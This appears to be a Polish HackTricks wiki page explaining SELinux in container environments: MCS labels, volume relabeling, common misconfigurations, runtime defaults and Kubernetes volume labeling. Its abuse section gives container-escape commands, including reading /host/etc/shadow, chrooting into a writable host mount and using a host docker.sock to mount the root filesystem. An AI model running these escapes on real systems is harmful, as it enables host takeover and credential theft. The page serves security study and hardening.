# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux to system **Mandatory Access Control oparty na etykietach**. Każdy istotny proces i obiekt może mieć kontekst bezpieczeństwa, a polityka określa, które domeny mogą wchodzić w interakcję z danymi typami oraz w jaki sposób. W środowiskach konteneryzowanych zazwyczaj oznacza to, że runtime uruchamia proces kontenera w ramach ograniczonej domeny kontenera i oznacza zawartość kontenera odpowiadającymi jej typami. Jeśli polityka działa prawidłowo, proces może odczytywać i zapisywać elementy, do których jego etykieta powinna mieć dostęp, a jednocześnie ma odmawiany dostęp do innych zasobów hosta, nawet jeśli staną się one widoczne przez mount.

Jest to jedna z najpotężniejszych dostępnych zabezpieczeń po stronie hosta we współczesnych wdrożeniach kontenerów Linux. Ma szczególne znaczenie w systemach Fedora, RHEL, CentOS Stream, OpenShift i innych ekosystemach skoncentrowanych na SELinux. W tych środowiskach analityk, który zignoruje SELinux, często błędnie zrozumie, dlaczego pozornie oczywista ścieżka do przejęcia hosta jest w rzeczywistości zablokowana.

## AppArmor Vs SELinux

Najłatwiejsza do zauważenia różnica na wysokim poziomie polega na tym, że AppArmor jest oparty na ścieżkach, podczas gdy SELinux jest **oparty na etykietach**. Ma to duże konsekwencje dla bezpieczeństwa kontenerów. Polityka oparta na ścieżkach może działać inaczej, jeśli ta sama zawartość hosta stanie się widoczna pod nieoczekiwaną ścieżką mount. Polityka oparta na etykietach sprawdza natomiast etykietę obiektu oraz to, co domena procesu może z nim zrobić. Nie oznacza to, że SELinux jest prosty, ale zapewnia odporność na pewną klasę założeń dotyczących manipulowania ścieżkami, które obrońcy czasami nieumyślnie przyjmują w systemach opartych na AppArmor.

Ponieważ model jest zorientowany na etykiety, obsługa volume kontenera i decyzje dotyczące ponownego etykietowania mają kluczowe znaczenie dla bezpieczeństwa. Jeśli runtime lub operator zmieni etykiety zbyt szeroko, aby „umożliwić działanie mountów”, granica polityki, która miała izolować workload, może stać się znacznie słabsza, niż zamierzano.

## Lab

Aby sprawdzić, czy SELinux jest aktywny na hoście:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Aby sprawdzić istniejące etykiety na hoście:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Aby porównać normalne uruchomienie z takim, w którym etykietowanie jest wyłączone:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hoście z włączonym SELinux jest to bardzo praktyczna demonstracja, ponieważ pokazuje różnicę między workloadem działającym w oczekiwanej domenie kontenera a takim, z którego usunięto tę warstwę egzekwowania zasad.

## Użycie w środowisku uruchomieniowym

Podman jest szczególnie dobrze zintegrowany z SELinux w systemach, w których SELinux jest częścią domyślnej platformy. Rootless Podman wraz z SELinux to jedna z najsilniejszych powszechnie stosowanych baz bezpieczeństwa kontenerów, ponieważ proces jest już nieuprzywilejowany po stronie hosta, a jednocześnie nadal podlega ograniczeniom polityki MAC. Docker również może korzystać z SELinux, jeśli jest on obsługiwany, chociaż administratorzy czasami go wyłączają, aby obejść problemy związane z etykietowaniem wolumenów. CRI-O i OpenShift w dużym stopniu opierają izolację kontenerów na SELinux. Kubernetes może również udostępniać ustawienia związane z SELinux, ale ich wartość oczywiście zależy od tego, czy system operacyjny węzła faktycznie obsługuje i wymusza SELinux.<sup>[[2]](#references)</sup>

Powtarzający się wniosek jest taki, że SELinux nie jest opcjonalnym dodatkiem. W ekosystemach, które są wokół niego zbudowane, stanowi część oczekiwanej granicy bezpieczeństwa. Informacje o enumeracji polityk po stronie hosta, analizie przejść oraz nadużywaniu narzędzi administracyjnych SELinux znajdziesz na [ogólnej stronie SELinux](../../../interesting-files-permissions/selinux.md).

## Kategorie MCS i ponowne etykietowanie wolumenów

Izolacja kontenerów jest zazwyczaj połączeniem **wymuszania typów** oraz **Multi-Category Security (MCS)**. Dwa procesy mogą działać jako `container_t`, ale otrzymywać różne poziomy, takie jak `s0:c123,c456` i `s0:c321,c654`. Prywatna zawartość kontenera jest oznaczana etykietą `container_file_t` wraz z pasującymi kategoriami, więc samo dotarcie do ścieżki innego kontenera nie wystarcza do uzyskania do niej dostępu. Runtimes zazwyczaj przydzielają parę kategorii; ręczne ponowne użycie poziomu celowo likwiduje to rozdzielenie między poszczególnymi kontenerami.<sup>[[3]](#references)</sup>

Porównuj etykiety procesów i montowań zamiast sprawdzać wyłącznie typ:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Sufiksy bind-mount zmieniają etykiety inode na hoście, a tym samym zmieniają granicę bezpieczeństwa, a nie tylko metadane montowania:<sup>[[3]](#references)</sup>

- `:Z` stosuje prywatną etykietę z kategoriami MCS kontenera. Jest odpowiednie dla woluminu należącego do jednego kontenera lub Pod.
- `:z` stosuje współdzieloną etykietę, aby inne kontenery działające w ograniczonym środowisku również mogły korzystać z zawartości (z uwzględnieniem uprawnień DAC). Użycie go dla sekretów lub danych przypisanych do konkretnego tenanta usuwa izolację MCS, która w przeciwnym razie rozdzielałaby kontenery.
- Zmiana etykiet jest rekurencyjna. Zastosowanie którejkolwiek z tych opcji do obszernych drzew na hoście, takich jak `/`, `/etc`, `/usr` lub całe drzewo katalogu domowego, może zarówno udostępnić zawartość wybranemu kontenerowi, jak i zatrzymać usługi hosta, których oczekiwane etykiety zostały zastąpione.

Ręczne ponowne użycie poziomu jest łatwe do wykrycia w wierszach poleceń i manifestach. Poniższe dwa kontenery celowo otrzymują ten sam poziom MCS i dlatego mogą korzystać z zawartości oznaczonej tym poziomem:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Rozróżnij również `label=nested` od `label=disable`: pierwsze udostępnia operacje SELinux wewnątrz kontenera i zezwala na zmiany etykiet tylko tam, gdzie pozwala na to polityka, podczas gdy drugie usuwa separację etykiet dla tego workloadu. Oba przypadki wymagają analizy, ale nie są równoważne.<sup>[[3]](#references)</sup>

## Błędne konfiguracje

Klasycznym błędem jest `label=disable`. W praktyce często dzieje się tak, ponieważ odmówiono dostępu do volume mount, a najszybszym krótkoterminowym rozwiązaniem było usunięcie SELinux z równania zamiast naprawienia modelu etykietowania.<sup>[[1]](#references)</sup> Innym częstym błędem jest nieprawidłowe relabeling treści hosta. Szeroko zakrojone operacje relabeling mogą sprawić, że aplikacja zacznie działać, ale mogą również rozszerzyć zakres zasobów, z którymi kontener może wchodzić w interakcję, znacznie poza pierwotne założenia.

Ważne jest również, aby nie mylić **zainstalowanego** SELinux z **aktywnie stosowanym** SELinux. Host może obsługiwać SELinux i nadal działać w trybie permissive, albo runtime może nie uruchamiać workloadu w oczekiwanej domenie. W takich przypadkach ochrona jest znacznie słabsza, niż mogłaby sugerować dokumentacja.

## Nadużycia

Gdy SELinux jest nieobecny, działa w trybie permissive albo jest szeroko wyłączony dla workloadu, ścieżki zamontowane z hosta stają się znacznie łatwiejsze do wykorzystania. Ten sam bind mount, który w innym przypadku byłby ograniczany przez etykiety, może stać się bezpośrednią drogą do danych hosta lub do jego modyfikacji. Jest to szczególnie istotne w połączeniu z zapisywalnymi volume mount, katalogami runtime kontenera lub operacyjnymi skrótami, które dla wygody udostępniały wrażliwe ścieżki hosta.

SELinux często wyjaśnia, dlaczego ogólny writeup dotyczący breakout działa natychmiast na jednym hoście, ale wielokrotnie zawodzi na innym, mimo że flagi runtime wyglądają podobnie. Brakującym elementem często nie jest wcale namespace ani capability, lecz granica etykiet, która pozostała nienaruszona.

Najszybszym praktycznym sprawdzeniem jest porównanie aktywnego kontekstu, a następnie sondowanie zamontowanych ścieżek hosta lub katalogów runtime, które normalnie byłyby ograniczone przez etykiety:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Jeśli obecny jest host bind mount, a SELinux labeling zostało wyłączone lub osłabione, często najpierw dochodzi do information disclosure:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Jeśli mount jest zapisywalny, a z punktu widzenia kernela kontener jest faktycznie host-root, następnym krokiem jest przetestowanie kontrolowanej modyfikacji hosta zamiast zgadywania:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostach obsługujących SELinux utrata etykiet w katalogach stanu środowiska uruchomieniowego może również ujawnić bezpośrednie ścieżki eskalacji uprawnień:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Te polecenia nie zastępują pełnego łańcucha escape, ale bardzo szybko pokazują, czy to SELinux uniemożliwiał dostęp do danych hosta lub modyfikowanie plików po stronie hosta.

### Pełny przykład: wyłączony SELinux + zapisywalny mount hosta

Jeśli etykietowanie SELinux jest wyłączone, a system plików hosta jest zamontowany z możliwością zapisu w `/host`, pełny host escape staje się standardowym przypadkiem nadużycia bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli `chroot` zakończy się powodzeniem, proces kontenera działa teraz z poziomu systemu plików hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Pełny przykład: SELinux wyłączony + katalog runtime

Jeśli workload może uzyskać dostęp do socketu runtime po wyłączeniu etykiet, escape można delegować do runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Istotna obserwacja jest taka, że SELinux często był mechanizmem kontroli uniemożliwiającym dokładnie tego rodzaju dostęp do ścieżek hosta lub stanu środowiska uruchomieniowego.

## Kontrole

Celem kontroli SELinux jest potwierdzenie, że SELinux jest włączony, zidentyfikowanie bieżącego kontekstu bezpieczeństwa oraz sprawdzenie, czy interesujące Cię pliki lub ścieżki są rzeczywiście ograniczone etykietami.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Co jest tutaj interesujące:

- `getenforce` powinno najlepiej zwracać `Enforcing`; `Permissive` lub `Disabled` zmienia znaczenie całej sekcji SELinux.
- Jeśli kontekst bieżącego procesu wygląda nieoczekiwanie lub jest zbyt szeroki, workload może nie działać zgodnie z przeznaczoną polityką kontenera.
- Jeśli pliki montowane z hosta lub katalogi runtime mają etykiety, do których proces ma zbyt swobodny dostęp, bind mounts stają się znacznie bardziej niebezpieczne.

Podczas analizy kontenera na platformie obsługującej SELinux nie traktuj etykietowania jako drugorzędnego szczegółu. W wielu przypadkach jest ono jednym z głównych powodów, dla których host nie został jeszcze przejęty.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Zależny od hosta | Separacja SELinux jest dostępna na hostach z włączonym SELinux, ale dokładne zachowanie zależy od konfiguracji hosta/daemona | `--security-opt label=disable`, szerokie ponowne etykietowanie bind mounts, `--privileged` |
| Podman | Zwykle włączony na hostach SELinux | Separacja SELinux jest standardowym elementem Podmana na systemach SELinux, chyba że zostanie wyłączona | `--security-opt label=disable`, `label=false` w `containers.conf`, `--privileged` |
| Kubernetes | Przydzielany przez runtime na węzłach SELinux; możliwość jawnej konfiguracji | Runtime może przydzielić unikalną etykietę, gdy Pod jej nie ustawia. Jawne `securityContext.seLinuxOptions` kontroluje etykietę Pod/volume; w Kubernetes 1.37 kwalifikujące się volume używają domyślnie etykietowania SELinux podczas montowania | zduplikowane poziomy MCS, węzły w trybie permissive/disabled, szerokie uprzywilejowane workloady, bezrefleksyjne `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| Wdrożenia w stylu CRI-O / OpenShift | Zwykle intensywnie wykorzystywany | SELinux jest często kluczowym elementem modelu izolacji węzła w tych środowiskach | niestandardowe polityki nadmiernie rozszerzające dostęp, wyłączanie etykietowania w celu zapewnienia kompatybilności |

Domyślne ustawienia SELinux są bardziej zależne od dystrybucji niż domyślne ustawienia seccomp. W systemach w stylu Fedora/RHEL/OpenShift SELinux często stanowi centralny element modelu izolacji. Na systemach bez SELinux jest po prostu nieobecny.

## Etykietowanie Volume w Kubernetes 1.37

Kubernetes 1.37 uznał `SELinuxMount` za stabilne i włączył je domyślnie. W przypadku kwalifikującego się PVC, Pod z `seLinuxOptions` oraz sterownika CSI deklarującego `.spec.seLinuxMount: true`, kubelet używa `-o context=<label>` zamiast prosić runtime o rekurencyjne etykietowanie każdego inode. Nieobsługiwane sterowniki i typy volume nadal korzystają ze ścieżki rekurencyjnej. Eliminuje to konieczność wykonywania dużego przejścia w celu ponownego etykietowania, a także zapobiega zmianie trwałych etykiet każdego pliku wyłącznie po to, aby udostępnić volume Podowi.<sup>[[2]](#references)[[4]](#references)</sup>

Montowanie może zawierać tylko jeden taki kontekst. W rezultacie Pody z **różnymi etykietami SELinux**, które używają tego samego kwalifikującego się volume na tym samym węźle, nie współistnieją już przy domyślnym zachowaniu `MountOption`: jeden pozostaje w stanie `ContainerCreating` z błędem `conflicting SELinux labels of volume`. Traktuj to zarówno jako problem z dostępnością, jak i przydatną wskazówkę, że workloady mogły niejawnie współdzielić storage ponad granicami MCS. Jeśli takie współdzielenie jest zamierzone — na przykład uprzywilejowany Pod `spc_t` i ograniczony Pod korzystają z tego samego volume — obejściem kompatybilności dla pojedynczego Poda jest `seLinuxChangePolicy: Recursive`; nie stosuj go w całym klastrze bez zrozumienia, które ścieżki runtime ponownie oznaczy.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Przydatne kontrole po stronie klastra:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Opcjonalny `selinux-warning-controller` kube-controller-manager wykrywa Pody, które współdzielą wolumen z niezgodnymi etykietami, i udostępnia metrykę `selinux_warning_controller_selinux_volume_conflict`. Włącz go i przeanalizuj przed aktualizacjami lub zmianą sposobu nadawania etykiet wolumenom; pomaga odróżnić rzeczywisty konflikt zasad od zwykłej awarii CSI lub systemu plików.<sup>[[2]](#references)</sup>

## References

- [1] [Dokumentacja Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Konfigurowanie kontekstu bezpieczeństwa dla Poda lub kontenera](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Dokumentacja podman run: etykiety SELinux i ponowne etykietowanie wolumenów](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Wydanie Kubernetes v1.37: SELinuxMount i SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
